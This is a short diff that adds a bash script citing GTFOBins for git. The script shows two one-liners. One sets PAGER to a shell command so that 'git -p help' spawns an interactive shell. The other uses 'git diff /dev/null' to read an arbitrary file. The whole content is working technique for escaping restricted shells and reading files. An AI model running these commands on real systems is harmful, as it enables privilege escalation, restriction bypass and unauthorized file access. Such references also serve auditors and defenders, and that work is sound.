@@ -1,0 +1,9 @@
+#!/usr/bin/env bash
+# https://gtfobins.github.io/gtfobins/git/
+
+# Open a shell
+PAGER='sh -c "exec sh 0<&1"' git -p help
+
+# Read file.txt
+git diff /dev/null file.txt
+
